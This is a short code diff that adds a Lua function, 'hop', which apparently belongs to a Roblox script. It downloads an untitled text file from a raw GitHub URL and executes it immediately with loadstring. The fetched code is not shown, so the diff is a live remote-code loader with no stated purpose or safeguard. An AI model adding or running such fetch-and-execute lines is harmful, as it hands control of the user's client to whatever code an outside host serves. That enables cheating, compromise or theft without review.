@@ -1,0 +1,3 @@
+local function hop()
+  loadstring(game:HttpGet(("https://raw.githubusercontent.com/kbao1331-stack/Testh/refs/heads/main/Ch%C6%B0a%20c%C3%B3%20ti%C3%AAu%20%C4%91%E1%BB%81.txt")))()
+end
